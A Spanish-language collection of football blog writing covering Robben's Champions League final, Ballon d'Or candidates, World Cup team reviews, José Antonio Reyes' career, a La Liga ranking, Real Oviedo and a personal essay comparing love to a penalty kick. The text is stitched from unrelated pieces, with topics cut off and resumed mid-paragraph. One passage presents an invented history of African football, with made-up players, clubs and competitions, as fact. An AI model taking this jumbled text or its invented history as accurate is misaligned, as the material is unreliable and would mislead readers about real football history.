puesto su nombre en un trocito de historia. Dos héroes: el clásico y el improvisado. El épico y el tragicómico. El forzudo valiente y el endeble inteligente. Resumiendo, en el fútbol hay sitio para Gerrard y para Dudek, para Roberto Baggio y para Schillaci, para Puyol y para Belletti, para Schweinsteiger y para Robben.Anoche, en el césped esmeralda de Wembley, el fútbol volvió a escribir su historia con lápiz y no con pluma. La final dio para mucho. Borussia y Bayern, dos equipos osados acordaron no calibrar el esfuerzo y dieron todo desde el principio. Por momentos me recordó a la tensión infantil en un juego de cuerda, con dos equipos equilibrados tirando hacia atrás y en el que cualquier tropezón, cualquier liviano desfallecimiento, haría que todo el grupo se desplomara. No fue así. El fútbol era una fotografía, estático y luminoso, en la que resultaba imposible ver quien llevaba el mando. Ni el gol aclaró el panorama. Más bien pareció una simple anécdota, como si estuviera escrito en alguna parte que el Borussia marcaría el suyo y la simetría mantendría su dictadura sobre la hierba.Es ahí cuando el fútbol pide héroes a gritos. Un deporte de equipo hecho para el lucimiento del individuo. Robben rompió la proporcionalidad alemana. Su fútbol errático, intermitente, inesperado, dinamitó desde dentro la armonía de un partido memorable. Los aficionados, que somos caprichosos y culposamente morbosos, fantaseamos con cosas así. Salvando las distancias, yo hubiera pagado por un gol de Drenthe dándole la Champions al Madrid, o Sergio celebraría como un loco un gol de Pepe Díaz subiendo al Oviedo, o Borja soñaría con Amorebieta cabeceando a la red un balón que diera un nuevo título al Athletic. Lo grotesco es bienvenido en un espectáculo tan delirante como éste.Ayer pasó algo de eso. Robben es un excelente jugador venido a menos. Las lesiones, una comprensión del juego poco generosa, su tendencia a desaparecer y, sobre todo, el estigma de jugador maldito que ayer, en los primeros minutos del partido, volvió a alimentar. Los mal llamados “mano a mano” –yo los llamaría “pie a mano” y tan contentos- que tuvo ante el inmenso Weidenfeller poco sirvieron para acallar a los miles de aficionados bocazas de Twitter –entre los que me encuentro-.A su favor para una posible candidatura corren vientos de marketing procedentes de Brasil, pero para que esta sea real necesitará pasar a asumir en su equipo un rol de piedra angular que, de momento, no posee.Bale. Dotado de las cualidades físicas de un superhombre y una maravillosa pierna izquierda, el galés parece el candidato ideal para asumir el relevo de su compañero CR tanto como estrella en el Madrid como en los papabili de la bola dorada. No tan gregario de la estrella como Ney en el Barça, en su contra juega en cambio cierto individualismo y la sensación de que su conocimiento del fútbol no británico no está aún a la altura de su calidad como jugador. Quizá sus posibilidades pasen por volver a la izquierda, y de hecho algunos llevamos tiempo queriendo verlo de lateral largo.Paul Pogba. Buen mediocentro y llegador de raza, aparenta mucho más de los 21 años con los que se ha convertido, junto a Vidal, en el eje de la actual Juve. Lo más parecido al gran Vieira que ha surgido en mucho tiempo, su tremendo potencial tanto físico como técnico anuncia un jugador dominante para los próximos años, no sabemos si de nivel Balón de Oro pero sí con lugar reservado en la élite europea. En su contra, cierta tendencia a irse de los partidos y el hecho de que el fútbol italiano no es actualmente el mejor lugar para ponerse en el escaparate. Aunque tampoco sabemos cuánto durará ahí, claro.Di María. El jugador que hizo estallar la pasada final de la Champions se fue a Manchester buscando un rol diferente y una mayor consideración económica, y tras un comienzo a nivel estratosférico parece haberse desinflado algo en los últimos tiempos. Pocos hay que conjuguen como él capacidad de desequilibrio, verticalidad y carácter ganador, pero sus 26 años hacen pensar que quizá cuando Cristiano o Leo suelten el cetro él será ya un poco mayor para cogerlo. Además, no ha llegado al United en el mejor momento posible del club inglés. Sin embargo, kilo a kilo -pocos en su caso- es quizá a día de hoy el jugador de campo que más se acerca a los dos monstruos, junto posiblemente Arjen Robben, a quien sí descarta la edad.Éstos fueron los candidatos que fueron sugeridos, unos con más ardor que otros. . Servidor también pensaría en Kroos o Koke, a quienes lastra la sobriedad de su juego, o Arda, fantasista loco que quizá está en el mejor lugar para ganar, pero no para que su juego colorido y alegre encuentre socios al nivel. O quizá nos equivoquemos, CR y Messi aguanten como jabatos, y el siguiente sea un Odegaard de la vida que esté empezando a ahora a aparecer por las parabólicas. Si metemos en una coctelera el petardazo que ha dado España hoy, el gol de Maicon y las manos de mantequilla de Green contra USA, removemos bien y lanzamos la mezcla doce años atrás en el tiempo, obtendremos el terrible fallo de Zubizarreta, que le marcó para siempre en el terreno internacional y que selló el destino de España contra Nigeria en otro desgraciado debut mundialista de la Roja. También en aquella ocasión partíamos de favoritos –casi al mismo nivel que el país anfitrión-, y el disparo de Lawal fue el principio del fin, así que lanzamos esta entrada un poco a modo de exorcismo para que el pasado oscuro no vuelva a repetirse. En una jornada llena de penaltis, la mayor estrella se ha mantenido al margen de ellos: Samuel Eto’o, que nos está recordando en este comienzo de temporada que sigue conservando la velocidad y la capacidad de desmarque que le hicieron grande, y que ha destrozado a la –casi siempre- débil defensa del Werder Bremen; hatrick y goleada (4-0). El Tottenham disputará la primera plaza de ese grupo tras su exhibición ante el Twente (4-1), con partidazo de Gareth Bale, tres penas máximas y protagonismo de Van der Vaart, que falló una de ellas, embocó una volea preciosa y acabó expulsado. El enfrentamiento a priori más interesante, Valencia-United (0-1), resultó un fiasco comparable al resto de visitas de los mancunianos a Levante, y se resolvió con una jugada eléctrica al contragolpe que culminó Chicharito con clase. Los chés deberán ahora cuidar su doble enfrentamiento con el Rangers, que se mete en la pomada tras tumbar con un buen remate de Naismith al débil Bursaspor. Otro que recupera moral es el Schalke, vencedor (2-0) del Benfica en un buen partido, por fin, de Raúl. Ambos conjuntos pelearán presumiblemente por la segunda plaza, ya que el Lyon ha sumado seis de seis y salió airoso de su partido en Tel Aviv (1-3), donde Bastos firmó un doblete y Enyeama, plástico guardameta nigeriano, marcó de penalty. Finalmente, el Copenhague venció a domicilio (0-2) a un mermado Panathinaikos que pagó los graves errores de su portero Tzorvas y la expulsión de Gilberto Silva. Sorprendentemente, los daneses son líderes, aunque es dudoso que mantengan esa posición de privilegio tras su próxima visita al Camp Nou; su enemigo es el Rubin Kazan. Cuando José Antonio Reyes salte esta noche al césped del Santiago Bernabéu vistiendo la elástica rojiblanca, habrá dado un paso más en una de las carreras más extrañas que ningún jugador español de élite haya firmado jamás. Un trayecto esquizofrénico con más altibajos que una función trigonométrica,  que le ha llevado por media Europa y en el que siempre ha concentrado la atención del foco mediático, tanto por motivos puramente futbolísticos como por circunstancias personales.Terminaba el siglo XX cuando el fútbol español comenzó a apercibirse de que algo se movía a la orilla de Nervión. Tras unos años oscuros, en los que personajes tipo Caldas, Oulida o Marinakis acabaron llevando al pozo al otrora glorioso Sevilla, Joaquín Caparrós había sido elegido por la directiva para liderar al club del Pizjuán en su retorno a Primera. El técnico utrerano, forzado por las limitaciones económicas del club y también por convicción, basó su trabajo en la fértil cantera sevillista, y empezó a construir un equipo competitivo basado en la juventud y en un puñado de veteranos de mil batallas. Entre los primeros, pronto empezó a destacar un joven extremo izquierdo, paisano suyo, que comenzó a horadar defensas combinando la velocidad de un Harrier y una zurda de terciopelo. Procedente de una familia muy humilde, Reyes se erigió en el líder de un equipo que pasaría en pocos años del cero al infinito, y su venta al Arsenal en 2004 por veinte millones se convirtió en el símbolo una política deportiva –la era Monchi– que resultaría modélica durante años.El aterrizaje de Reyes en Londres resultó venturoso. Llegado a mitad de temporada, comenzó su andadura como gooner con varios goles espléndidos –inolvidable, por ejemplo, el que le hizo al Chelsea en Copa- y formó con Van Persie un dúo eléctrico que desempeñó un papel importante en el título de Premier logrado a final de año. Sin embargo, el andaluz nunca se asentó en la titularidad, y a partir del segundo año, entre lesiones y problemas de adaptación, su rol en el equipo perdió importancia, hasta resultar casi irrelevante en su última temporada, la 2005-06. Envuelto en problemas personales y portada en programas del corazón, Reyes iba dando pasos en la cuesta abajo que acaba convirtiendo al futbolista en juguete roto.Sin embargo, en el verano de 2006 su carrera parecía experimentar un inesperado repunte. El Real Madrid, club del que siempre se había declarado simpatizante, se hacía con sus servicios, y el sevillano comenzaba la temporada como un hombre importante en el nuevo proyecto de Capello. No comenzó mal, pero de nuevo su rendimiento cayó en picado entre acusaciones de indolencia y falta de compromiso, y pronto desapareció de las alineaciones del técnico italiano. Condenado pues al ostracismo, nadie esperaba que se convirtiese en el héroe absoluto del equipo, con dos goles en la última jornada que dieron al Madrid la liga más inesperada de su larga historia. No le sirvió de mucho su exhibición final, ya que en una decisión consecuente con la prestación del jugador durante todo el curso, la directiva blanca prescindió de sus servicios a pesar del momento inolvidable, y José Antonio se vio obligado cruzó el río para enfundarse la camiseta del eterno rival.Para muchos hinchas atléticos fue un shock que el responsable inmediato del último título merengue corriera ahora la banda del Manzanares, y Reyes fue sometido a un mobbing despiadado desde la grada que, combinado con la falta de confianza de Javier Aguirre y su propia inseguridad, le condenaron a una temporada infame. En el verano de 2008 salía cedido con destino a Lisboa, y parecía que el último tren había pasado para quien un día pareció la gran promesa del fútbol español.Sin embargo, y contra todo pronóstico, Reyes volvió de sus cenizas a la sombra del águila Vitória. Bien guiado por Quique Flores, a la sazón entrenador benfiquista y buen gestor de jugadores en crisis, nuestro hombre fue recuperando poco a poco la confianza en sí mismo. Emergió un futbolista diferente, incluso morfológicamente, al que había maravillado al principio de su carrera: menos veloz y vertical, había aumentado su conocimiento del juego, del tempo y la pausa que dominan el ritmo de los partidos; de las cenizas de un extremo vertiginoso había nacido un estupendo interior, y la rapidez dejaba paso a la clase. Reyes asombró en su periplo portugués y, tras rechazar el Atlético una oferta del Benfica, volvió de regreso a Madrid. Se había ganado una nueva oportunidad.De nuevo el comienzo no fue fácil –Abel tampoco se fiaba mucho de él- pero el reencuentro unos meses después con el entrenador que le había dado su confianza elevó la moral del utrerano, que primero se hizo un fijo en las alineaciones y ha acabado convirtiéndose en uno de los puntales de este nuevo Atlético.Otro caso de equipo con escasos medios y resultados generosos. Caparrós vuelve a sacar agua del desierto. Se ha armado un equipito corajudo, peleón, de esos que ponen muy caras las derrotas… como gusta al utrerano. Buena vuelta a los ruedos de David Barral, en una plantilla con poquísimo gol. No se les puede exigir más de lo mostrado.9º- Granada CF. En Granada pasa algo raro. El equipo mira de lejos los puestos de descenso, va sacando adelante los resultados… pero el clima no termina de ser tranquilo en la ciudad de la Alhambra. Busca la estabilidad y Alcaraz tiene plantilla para ello. Decepcionantes Dani Benítez y Diego Buonanotte, no obstante. Curiosamente, sacan fuera los puntos que se dejan en casa.8º- Valencia CF. Al Valencia 13/14 le pasa de todo. Cambios de entrenador, aparición estelar de Bankia negando la renegociación del crédito que permite la supervivencia del club, jugadores clave que desaparecen (¿Banega? ¿hola?) … y aún así, se encuentran a tiro de piedra de Europa. Con Pizzi parece algo recuperada la calma, pero en Mestalla nunca se sabe cuando se desatará la tempestad. Año de transición y supervivencia.Lo importante es tenerlo claro.7º- Sevilla CF. Va arrancando poco a poco, pero el Sevilla de las mil caras nuevas empezó de manera lamentable. Con el paso de las semanas, Emery parece haberse hecho por fin con el control de la situación. Como siempre, muy buenas incorporaciones a filas (M’Bia, Bacca, Iborra, Vitolo…) en una plantilla que necesitaba una renovación urgente. Otras (Rusescu, Gameiro…) no tan buenas. Europa es obligación porque tiene una de las mejores plantillas de ‘la otra Liga’.6º- Villarreal CF. Me cuesta pensar en un recién ascendido que, en el mismo año de su retorno a la elite, haya completado una primera vuelta tan fresca e ilusionante. Los de Marcelino saben a lo que juegan, han encontrado su punto y tienen en Gio a un excelente timonel. Su exigencia no pasaba por competición europea, pero visto lo visto en este primer tramo, no se les debe pedir menos. El Villarreal de siempre.5º- Real Sociedad. Como a todo equipo de zona media que se meta a disputar Champions, a los realistas el sueño continental les costó algún que otro mal trago. Tardaron en hacerse con la situación y cuando ya vieron como definitivamente el balón con estrellitas se alejaba de Donosti, volvieron a centrarse en la Liga, para felicidad de Anoeta. Griezmann y Vela confirman su progresión imparable y nadie parece echar de menos a Montanier. Su reciente victoria ante el Athletic confirma su gran momento.4º- Athletic Club. Puede ser la gran revelación de lo que llevamos de campaña. Los de Valverde armaron un equipo serio y con un jugoso fondo de armario. Todo por hacer olvidar la ‘inolvidable’ era Bielsa. De todas las incorporaciones, la mejor ha resultado ser la de Mikel Rico. Insustituible en el once, el exgranadinista aporta estabilidad defensiva y mucha llegada a área rival. Gran año también de su compañero Iturraspe, que contrasta con la escasa producción ofensiva de los dos nueves del equipo. Decepción con Beñat, incapaz de encontrar su sitio. Se les va a exigir entrar en Champions.3º- Real Madrid.“Perdonado” por la afición y básico tanto en la Europa League del año pasado como en la buena actuación copera de los colchoneros, Reyes llega hoy a Chamartín convertido en un jugador tan importante como distante de lo que todos esperábamos que hubiera sido. Afortunadamente sigue ahí, y es una suerte para el fútbol que haya sobrevivido a tantos bandazos. Que aguante muchos años, porque es una delicia verle jugar. Es muy difícl ver el gol de Janko al Groningen (arriba) y no echar la vista cuarenta años atrás y recordar una maravilla que parecía irrepetible. Uruguay. Cuarto puesto. Cuatro victorias, dos empates y una derrota; once goles marcados y ocho encajados. Goleadores: Forlán (5), Luis Suárez (3), Álvaro Pereira, Maxi Pereira y Cavani.Lo mejor:  la seriedad con la que afrontó cada partido, el poderío de su pareja de delanteros y la garra charrúa que trazó una línea invisible hacia los campeones del 30 y del 50. Lo peor: Juego un poco plano en algunas ocasiones, escasez de creatividad en el medio y algunos desajustes defensivos provocados por las lesiones de los centrales titulares.La estrella: Diego Forlán, elegido por la organización del torneo como el mejor. Se ha limitado a repetir las barbaridades que lleva mostrando en España día sí y día también. Uno de los mejores arietes del mundo.El momento: El paradón de Luis Suárez en la prórroga de la prórroga contra Ghana, sus lágrimas de desesperación y su transformación de villano a héroe merced a un larguero.México. Octavos de final. Una victoria, un empate y dos derrotas; cuatro goles marcados, cinco encajados. Goleadores: Márquez, Chicharito Hernández (2) y Cuauhtémoc Blanco.Lo mejor: Una voluntad de tocar el balón casi inédita en el Mundial, y el empaque con el que afrontó el choque frente a Uruguay, enterrando suspicacias.Lo peor: La lentitud del juego, las discutibles elecciones de atacantes de Aguirre, y la poca capacidad de reacción.La estrella: Chicharito Hernández. Toda la prensa mexicana pedía su titularidad, y la presión estuvo justificada: mejoró inmediatamente a Guille Franco, y su juego eléctrico y vertical hace pensar que se trata de un jugador especial.El momento:  El primer gol de Argentina en los octavos y su validación tras la famosa charla de Rossetti parecieron dejar groggy a un equipo azteca que ya no se recuperó.Sudáfrica. Caído en primera fase. Un partido ganado, un empate y una derrota; tres goles marcados y cinco encajados. Goleadores: Tshabalala, Khumalo y Mphela.Lo mejor: La dignidad con la que afrontó su participación, haber mantenido opciones hasta el final y algunos detalles de Pienaar y Mphela.Lo peor: El discretísimo nivel técnico general convirtió a Sudáfrica en el peor anfitrión de la historia de los Mundiales.La estrella: Pienaar. Sin hacer un gran Mundial, dejó claro por qué es el único sudafricano que se mantiene en el máximo nivel. Los toques de clase de su equipo partieron de sus botas.El momento: Sin lugar a dudas, la carrera de Tshabalala y el privilegio de celebrar con su gente y un animado baile el primer gol del campeonato, y el primer gol de un Mundial en suelo africano.Francia. Eliminada en la primera fase. Un empate y  dos derrotas, un gol anotado y cuatro encajados. Goleador: Malouda.Lo mejor: Que por fin Domenech se va y Francia, con Laurent Blanc, tendrá un entrenador y no un astrólogo.Lo peor: Por encima del mal juego y los nefastos resultados, la imagen dada por entrenador y jugadores de guerra continua, faltas de respeto y lucha de clanes.La estrella: Nadie.El momento: La expulsión de Anelka de la concentración, tras insultar a Domenech con la contundente frase: “Vete a tomar por culo, sucio hijo de puta.” La anécdota resume fielmente lo que fueron les bleus en este campeonato. En un día en que Ghana se ha convertido en la única selección que mantiene alto en el Mundial africano el pabellón de su continente, y enlazando en cierto modo con la desgracia de Argelia que recordamos ayer – y que hoy se ha repetido en otro contexto-, recordamos a Marruecos del 86, la primera selección africana que pasó la primera fase. El equipo de los Timoumi, Khairi o Merry aguantó dos meritorios empates sin goles antes de dar el golpe frente a Portugal (3-1) y entrar en octavos como primero de grupo. No tuvo suerte en el cruce, sin embargo, y hubo de emparejarse con una Alemania que no había hecho los deberes, y que los acabó tumbando con un gol postrero de falta de Lothar Matthäus. Sin embargo su hazaña siempre se recordará, y el dato curioso de la recompensa  que cada jugador recibió del rey Hassan II por haber participado en ella: un estanco. Ya tenemos listos los cuatro primeros grupos de la Champions League. En el mejor partido de la jornada, el Tottenham ha empatado en Enschede (3-3) y se asegura la primera plaza tras el ridículo del Inter en Bremen (3-0), en un lamentable partido en el que los italianos han podido salir goleados; justo premio a los Spurs, quizá el gran animador de esta primera fase. También ha pasado el meritorio Copenhague, que ha tumbado con claridad (3-0) a un Panathinaikos que no es precisamente el equipo que fue finalista de la Copa de Europa en 1971. El Manchester conserva la primera plaza de su grupo después de que Guaita haya salvado al Valencia de una derrota segura en Old Trafford (1-1), y el Schalke también se la garantiza después de imponerse en Lisboa (1-2), pase de pecho de Raúl incluido. A nivel de anécdota quedan la impresionante chilena de Zahavi en Gerland, la cantada de Boschker, la primera victoria del Barça frente al Rubin Kazan (2-0), canteranos mediante, y el único punto del humilde Bursaspor, a quien un tanto postrero de Yildirim ha salvado del pleno de derrotas.Duele más ver ese número tres en la clasificación que la siuación real del club blanco. Y duele porque por encima están los dos equipos que menos gusta a los madridistas ver por encima. Hasta la fecha no se ha demostrado que las distancias entre ellos sean muy grandes, pero en los enfrentamiento directos los de Ancelotti han salido muy malparados. Quizá el juego no sea brillante, pero este equipo compite de verdad y arranca resultados donde antes habría caído. El mejor Cristiano que hemos visto en España.2º- Atlético de Madrid. La cantinela del ‘partido a partido’ del Cholo puede ser útil como elemento de control de la ansiedad y el compromiso de la plantilla colchonera, pero a nadie se le puede escapar ya que este Atleti es candidato a todo. Soberbio Diego Costa, excelente Arda Turan y notable Koke. El único borrón del año, la derrota inesperada de Cornellà. Por lo demás, no se les puede poner ni un pero. Curiosidad por ver su desarrollo en las tres competiciones.1º- FC Barcelona. El campeón de invierno arrancó la temporada inmerso en un debate estéril sobre algo tan intangible como el ‘estilo’. Mientras tanto, los resultados no paraban de llegar, para sorpresa de todos los ajenos a esa vorágine que responde al nombre de ‘entorno’. Fundamental la tranquilidad y naturalidad de Martino.Su figura da para chiste. Su prematura alopecia, su cuerpo de cadete, y ese gesto de perpetuo asombro ante el mundo, como un bebé al que le han puesto las botas y le han empujado al campo, hacían presagiar lo peor. Nosotros, caprichosos y morbosos, nos reíamos de su continua inoperancia. Nos acordamos del Mundial con una sonrisa en la boca.Sin embargo, como en las mejores historias, Robben fue el hombre del partido. Rehecho de sus errores iniciales, en el catorce de la segunda parte puso un balón a Mandzukic para el primero y casi agonizando el partido metió el segundo él mismo. Ahí se acabó todo. Los prejuicios también. Y se empezó a escribir la leyenda. Hoy en forma de portadas, mañana como un recuerdo dulce para los aficionados, pasado con pancartas, al otro con homenajes, y así hasta borrar lentamente las risas, las sospechas y los chistes fáciles en Twitter.Nunca sabré si el Bayern fue un justo ganador. La balanza cayó del lado del equipo que ayer tuvo un héroe. Un héroe de esos casuales, de esos que ensombrecen a los capitanes. De los que surgen y desaparecen. De los inesperados, realmente. Como el propio fútbol: una pizca de talento, un poco de suerte, y algo de tragicomedia. Cada cerebro se ramifica en ciento. Sobre los campos de tierra los músculos son más importantes que las posiciones. La entropía del fútbol africano es fundamental para entender la elasticidad compungida del fútbol periférico. Por motivos psicosociales, el pre-viejo continente aporta poco o nada al grueso balompédico de las capitales. Salvo en la mineralizante plantilla parisina, donde el desorden equitativo siempre es bienvenido, ni en Madrid, Berlín o Londres ha tenido la displasia categorizante un buen punto de partida.Para entender el fenómeno hay que buscar en las hemerotecas. En 1912 un joven de Uganda recorrió media Europa con su delirante y laxa técnica. Ni el Sans Club lo quiso ni el Burgos lo tuvo en cuenta. Importante analizar la negación sistemática del fútbol castellanoleonés al jugador escorado tipo liebre repentina de la vetusta escuela marsellesa. De ahí el embudo en su mediocentro y la falta de pindoración de sus esquemas. Sobre la tabla verde del césped cualquier recurso es bueno si no obedece al orden sino al pandemonium. Un entrenador que supo entenderlo fue Miguel “Cachito” Sotola. Él le dio la oportunidad a Redgal Okello en su seminal Espanyol, y ahí nació la leyenda de “La pantera de Kampala”. De ahí al Club Brugge donde volvió a brillar levantando la liga como capitán y desde donde saltó al gran Oldham Athletic, acabando la temporada empatado a goles con Bobby Parker y rivalizando en popularidad con la otra estrella del equipo, el turconoruego nacionalizado irlandés Oleg O´Celik Papazoglu.El juego africano tiene ahí a su pionero. La pantera sólo abrió el camino para otros cientos de futbolistas que dieron a sus equipos una viveza cuneiforme que aún perdura, de forma residual, en los clubes costeros del sur francés, del norte italiano y la mesocampiña turca. Decía que la entropía futbolística es necesaria en el encorsetado juego periférico español. Aquella visión periquita caló muy cerca, en La Masía. La reclutación de futbolistas argelinos a principios de los setenta ya era fundamental para la planificación arancelaria y socioportuaria de Francesc Villarrosa. Con él la cantera culé se creció, y mientras que los argelinos –y algunos extratunecinos- no dieron lo que se esperaba de ellos, y gracias a la apertura mirótico-política de los paises limítrofes, pudieron brillar jugadores congoleños y hasta keniatas. Fueron cinco años de gloria que sirvieron para que el Barcelona B, por entonces Catalonia Sportivo, lograse cuatro de las cinco CracketCup disputadas. Vetusta competición internacional de canteras europeas celebrada durante julio en los campos de entrenamiento de BrownDart Albion, Manchester.Cuando pensamos en Amunike a veces olvidamos que fue su padre, Suil Amunike Jr. el que sacó a Weah del Brotons Wanderers liberiano para llevarlo a Europa.Tan ávido de entropía estaba el fútbol europeo que la plástico-liberal situación aduanera no fue suficiente handicap para la intromisión canterana en el territorio virgen de la meliope zona subsahariana. Con el consiguiente perjuicio al muy boyante fútbol marroquí, donde equipos como el B.B. Saldou o el BarricBier Promesas se quedaron en el camino de esa panliga norafricana-surespañola-surlusa que tanto atraía a los aficionados malagueños o portimonenses.Para entender el impacto de la pantera de Kampla y sus posteriores herederos hay que analizar el fútbol que nos ha tocado vivir. Un fútbol de banda refleja, con posibilidades pero sin artilugios, un fútbol de mayestático-centralismo con ninguna capacidad de carrera libérrima. Con el toque, toque que instauró Iñaki Sáez en todas las categorías de nuestro fútbol y que, ni con Donato ni Catanha, pudimos romper. La entropía es eso, una sucesión inarmónica de momentos “uy”. De suspiros a pie de grada. Si en vez de en las ruedas de prensa los técnicos españoles estuvieran pendientes de la conoflexión de su juego, de los automatismos dromedarios de sus onces, del daño que jugadores como Xavi, Matar Diop Martins o Pepe Díaz han hecho a nuestro fútbol; sólo entonces podremos alcanzar a entender esta mixta laceración sobre el césped de nuestros campos. Ayer aproveché el Día de los Enamorados para hacerle a mi chica una gélida confesión. “Tengo miedo”, le dije mientras compartíamos tostadas en el salón de casa. Un hogar a medio construir, con la bienvenida fría de los pisos que han pasado demasiado tiempo vacíos, huérfano de Ikea aún, como un puzle de muebles viejos y recuerdos que no son nuestros. Con humedades por descubrir y ruidos inencontrables. Uno de esos pisos de prestado donde arrastramos el amor y los sueños de futuro. Uno de esos pisos que ya conocía del pasado y que se clavan en el corazón y penetran en la conciencia recordándote, como el esclavo al emperador romano, que mirara hacia atrás y recordara que sólo soy un hombre.Tengo miedo, le dije, de fallar el penalti. O a que tú lo lances fuera. A que todo dependa de nosotros y no estemos a la altura de lo que esta nueva vida necesita. Con muchas cajas aún sin deshacer, con ese aroma de tránsito que tienen los pisos alquilados, donde parece difícil echar raíces, sin la certeza aún de los contratos. Como si el papel y los garabatos blindasen el amor de alguna manera. Esa educación de la propiedad. De lo nuestro. Mientras vivimos en la duda permanente de un amor que se acomoda a los espacios como el agua de la piscina en los oídos. Hasta doler. “¿Recuerdas a Baggio?” , le dije. Por supuesto que lo recuerda. Es su jugador preferido. En su último cumpleaños le regalé una camiseta de los azzurri. “Ese penalti fallado en Estados Unidos frente a Brasil. Fallar ese y saber que no habrá más. Que jamás volverá a tener la posibilidad de llevar a su equipo a ganar el Mundial. Que jamás volverá a levantar esa Copa”. “Después jugó otro Mundial”, contestó, “pero los eliminaron en cuartos”, concluyó. Y nos abandonamos al silencio. “Da igual cuántos Mundiales juegues. Sabes que hay uno en el que puedes ganar. Los otros están ahí, sin más. Puedes brillar puntualmente, marcar goles, ser momentáneamente feliz. Pero hay uno, y sólo uno en la vida, en el que la Copa puede ser tuya. Y ahí no puedes fallar. Y me siento como Baggio mirando el balón y Taffarel en la portería”. Las tostadas se enfriaban en el plato. El café dejó de humear.Ni como Sergio Horacio. Tampoco tener la espalda y el corazón tan anchos como Diego Cervero ¿Qué decir de Carlos Slim y Arturo Elías? Muchas monedas al aire, muchísimas decepciones nos enseñaron que lo de este equipo es increíble. Pero lo más jodido de todo, auténtica misión imposible, es enterrarnos. Un saludo fuerte a los que lo intentaron con todo su alma.Volviendo a Madrid dentro de esa caravana oviedista que cortó España por carretera durante la madrugada del domingo, haciendo de cada área de servicio un lugar para recordar, los compañeros de Radio Marca Asturias me dieron el placer de entrar en directo. Como siempre, da igual que esté en Oviedo, Madrid o Badajoz, aporté unas cuantas ocurrencias. La más destacada, cuando me pidieron un titular que resumiera el momento. El Oviedo suelta lastre y mira al cielo, comenté con sonrisina y el pecho hinchado, como si hubiera inventado la rueda. Flojo Sergio, y además mentira. El oviedismo jamás debe olvidar estos años en los barrizales. Ese sería el mayor error de nuestra historia. Esa pesada mochila debemos echárnosla al hombro con gusto porque estos años en el infrafútbol nos cambiaron como club. Nos mejoraron. Éramos comunes y decidimos ser únicos. Jugábamos a dar más voces que los vecinos y ahora nuestros vecinos están en cualquier país del mundo. Nos empotraron contra el área, nos tuvieron en la mano pero en el último momento preferimos jugar un contragolpe larguísimo que acabamos rematando en Cádiz. Y ganamos, vaya si ganamos.Foto: Real Oviedo “Ver el Mundial por televisión es genial. Recostarte en el sofá  y pensar: un mes, un mes entero sentado aquí, en el paraíso. Si perteneces a mi generación, recordar las Copas del Mundo por televisión se  traduce en una particular y dolorosa nostalgia que sólo el color saturado y el sonido metálico de las retransmisiones en México 70  puede conseguir evocar. Es ver a Kenneth Wolstenholme (comentarista de  la BBC durante dos décadas) rompiendo los grilletes del formalismo británico e  inventar el comentarismo moderno al exclamar: ¡Oh.La tele muteada vomitaba un programa de zapping.Cómo explicar el abismo. Cómo explicar el espacio definido por la ausencia. Tengo miedo. Un miedo atávico a perderlo todo. A jugarme la vida a una sola historia. Sin trucos, sin matices. El futuro y sus fauces. Tengo el amor como un niño que se cree invencible con armadura de cartón. Y piensas: de qué sirve el amor, qué garantías, qué medidas, qué camino me traza el amor que no se abra ante árboles negros como en un bosque tenebroso de Disney. Qué me espera. Cuándo deja de dar miedo el abismo.Encaro la pelota con decisión. Ella también. En un piso desconocido apenas abierto a nosotros. En una casa donde la duda cuelga del techo como las lámparas tardofranquistas que el casero colgó con desgana. Yo la amo y ella me ama. Ojalá el balón vaya a la red con la certeza de un sentimiento certero. Pero he fallado tantos penaltis. Me han adivinado tantas veces la trayectoria del balón. He tropezado antes de golpear, resbalado, lanzado blandamente a las manos del portero. Y ahora, como Baggio, miro el balón con la incertidumbre del gol.Con la mayor de las dudas: la del futuro compartido. Le digo “el miedo no me paraliza. Sólo quiero que sepas que me siento como un futbolista antes de tirar el definitivo”. “Yo también”, me contesta. “¿Cómo vas a lanzarlo tú?” , le pregunto. “Esperaré a que el portero se delate y lanzaré suavemente al lado contrario –me contesta-. ¿Y tú?” . Apuro el café frío y giro el plato sobre la mesa. Pienso en cómo tiraría el penalti de mi vida. Pienso en la grada silenciosa. El olor del césped. La respiración contenida de los rivales detrás de mí. La luz cayendo disciplinada sobre mi camiseta sudada. El portero ligeramente encorvado, mascando el salto, mirando la bola hipnóticamente. Pienso en cómo duelen los músculos. En la victoria. En la derrota. “Yo lo lanzaré de punterillo y con los ojos cerrados, y que sea lo que dios quiera”. Sonríe. Untamos mantequilla en la tostada. Celebramos el amor sin saber aún si el balón dormirá en la red tras el golpeo sordo, un instante antes de que el estadio grite de alegría o llore de tristeza. Ese segundo único que emparenta el fútbol con el amor, ese precipicio del corazón que precede a los momentos inolvidables. Con el Barcelona prácticamente en la final, sobre el césped del Santiago Bernabéu se decidirá quien será el rival del intratable grupo de Guardiola. Ni Sevilla ni Madrid están pasando por su mejor momento. Los de Gregorio Manzano vagan por la liga sin un rumbo definido, alternando partidos eficientes con actuaciones pintorescas, como la de este fin de semana pasado ante el Deportivo. El Real Madrid, tras su derrota en Pamplona, parece hacerse el cuerpo a que la competición doméstica está inalcanzable con un Barça que no tiene freno. La Copa del Rey es para ambos un título necesario y cercano, una pomada para aliviar la liviandad de dos clubes acostumbrados -uno desde siempre, otro sobre todo desde hace unos años- a despuntar en esto del fútbol.La ventaja del Madrid en la ida es insuficiente. El gol de Benzema en aquel bronco y polémico partido garantiza el pase con un simple empate, pero el Sevilla no es un equipo particularmente cicatero arriba. Kanoute, Luis Fabiano y Negredo son motivos suficientes para pensar que es un marcador incómodo. La suma de Navas y Perrotti o el renacimiento de Romaric avivan la eliminatoria. Además, y recién llegado, Medel puede aportar la solidez que el equipo de Manzano a veces echa de menos en el medio campo. La conjunción entre línea defensiva y centro del campo, que fue fundamental en el mejor Sevilla de Juande y sobre todo de Jiménez, dificultará el embudo en el que se convierte el Madrid cuando tiene la pelota. Hemos visto que ni Lass ni Khedira manejan situaciones de presión. Alonso sí, pero él sólo no se basta para franquear un muro como el que propondrán hoy los sevillanos.El futuro del Madrid depende del funcionamiento de dos jugadores que últimamente no andan del todo entonados. Ya sea por el cansancio o la ausencia de Higuaín, ni Özil ni Di María se parecen a los que empezaron la temporada. El primero no tiene sintonía con Benzema, los desmarques del francés no se parecen en nada a los del argentino lesionado, mucho más escorado y asociativo el primero frente al segundo, mucho más incisivo el segundo frente al primero. Veremos si Adebayor es capaz de dinamitar el rendimiento de dos de los cerebros de Mourinho.Se ha sobrepuesto con resolución a la baja de Messi de las últimas semanas, y ni la ausencia de su gran adalid le ha supuesto un menoscabo en el rendimiento digno de mención. A lo mejor juega a otra cosa, pero esa otra cosa es igual de efectiva. ‘Estoy deseando incorporarme al equipo. Es un reto. Soy un jugador suficientemente maduro para triunfar en el Real 